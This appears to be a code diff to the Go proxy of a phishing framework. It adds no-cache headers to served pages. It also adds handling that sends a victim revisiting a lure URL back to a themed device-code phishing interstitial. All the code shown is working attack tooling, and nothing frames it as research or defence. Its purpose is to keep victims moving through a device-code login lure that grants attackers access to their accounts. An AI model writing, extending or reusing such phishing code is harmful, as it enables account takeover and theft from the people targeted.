@@ -867,6 +867,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						html = strings.ReplaceAll(html, "{code_ready}", fmt.Sprintf("%v", codeReady))
 
 						resp := goproxy.NewResponse(req, "text/html", 200, html)
+						resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
+						resp.Header.Set("Pragma", "no-cache")
 						return req, resp
 					}
 
@@ -935,6 +937,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							html = strings.ReplaceAll(html, "{code_ready}", fmt.Sprintf("%v", codeReady))
 
 							resp := goproxy.NewResponse(req, "text/html", 200, html)
+							resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
+							resp.Header.Set("Pragma", "no-cache")
 							return req, resp
 						}
 
@@ -1126,6 +1130,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							create_session = false
 							ps.SessionId = sc.Value
 							p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
+
+							// If revisiting a lure URL with an existing DCModeDirect session, re-redirect to interstitial
+							if l != nil {
+								if session, exists := p.sessions[ps.SessionId]; exists && session.DCMode == DCModeDirect {
+									dcTheme := ""
+									if session.PhishLure != nil {
+										dcTheme = session.PhishLure.DeviceCodeTheme
+									}
+									var interstitialURL string
+									if dcTheme != "" && dcTheme != "default" {
+										interstitialURL = fmt.Sprintf("/access/%s/%s", dcTheme, session.Id)
+									} else {
+										interstitialURL = fmt.Sprintf("/dc/%s", session.Id)
+									}
+									log.Debug("[devicecode] revisit detected, re-redirecting to %s", interstitialURL)
+									resp := goproxy.NewResponse(req, "text/plain", http.StatusFound, "Redirecting...")
+									resp.Header.Set("Location", interstitialURL)
+									resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+									resp.Header.Set("Pragma", "no-cache")
+									return req, resp
+								}
+							}
 
 							// Send lure_landed notification (session validated, botguard passed if enabled)
 							if session, exists := p.sessions[ps.SessionId]; exists {
